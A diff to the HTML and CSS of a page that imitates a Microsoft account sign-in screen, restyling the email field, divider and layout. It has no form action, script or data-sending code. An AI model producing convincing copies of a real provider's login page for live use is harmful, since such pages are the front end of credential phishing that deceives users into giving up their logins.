@@ -24,15 +24,12 @@
 			max-width: 450px;
 			text-indent: 6.5%;
 		}
-		.sio {
+		#sio {
 			background-color: #ffffff;
-			border: 2px solid #ccc;
-			margin: 100px auto;
-			max-width: 430px;
-			padding: 8px 12px;
-			text-indent: 9%;
-			height: 30px;
-			position: relative; bottom: 75px;
+			height: 60px;
+		}
+		{
+
 		}
 		.sio:hover {
 			background-color: #e0e0e0;
@@ -57,14 +54,29 @@
 			outline: 3px solid transparent;
 
 		}
-
-		input[type="email"] {
+		.sio {
 			background-color: #ffffff;
+			border: 2px solid #ccc;
+			margin: 100px auto;
+			max-width: 430px;
+			padding: 8px 12px;
+			text-indent: 9%;
+			height: 30px;
+			position: relative; bottom: 75px;
+		}
+		.sio:hover {
+			background-color: #e0e0e0;
+		}
+		.si {
+			text-indent: 10%;
+			font-size: 150%;
+			color: rgb(51, 51, 51);
+			position: relative; bottom: 0px;
+		}
+
+		.rtb{
+			border: 1px solid #ffffff;
 			text-decoration: none;
-			border-top: #ffffff;
-			border-left: #ffffff;
-			border-right: #ffffff;
-			border-radius: 3px;
 			box-sizing: 30px;
 			display: block;
 			margin-bottom: 20px;
@@ -72,6 +84,11 @@
 			width: 85%;
 			font-size: 70%;
 			margin-left: 8%;
+		}
+		hr {
+			width: 370px;
+			position: relative; left: 1.52%;
+			position: relative; bottom: 25px;
 		}
 		.NA {
 			font-size: 60%;
@@ -131,6 +148,11 @@
 			text-align: center;
 			position: relative; bottom: 5px;
 		}
+		@media only screen and (max-width: 480px) {
+			.content-wrapper {
+				border: none;
+			}
+		}
 	</style>
 <body>
   <div class="content-wrapper">
@@ -141,7 +163,8 @@
 		<div class="si"><b> Sign in </b></p></div>
 	<div class="container">
 		<form>
-			<input type="email" class="rtb" id="username" name="username" width="20px" placeholder="Email address, phone number or Skype" required>
+			<input type="email" class="rtb" id="username"placeholder="Email address, phone number or Skype" required>
+			<hr>
 			<nav class="NA">No account? <a href="#" class="noaccount">Create one!</a></nav>
 			<p class="ca"><a href="#">Can't access your account?</a></p>
 					<a href="#" class="back">Back</a>
@@ -154,6 +177,7 @@
 			<span class="key"><img src="Images\Gkey2.png" width="25" alt="Image"></span>
 				<a href="#">Sign-in options</a>
 		</div>
+	</div>
 	</div>
 </body>
 </head>
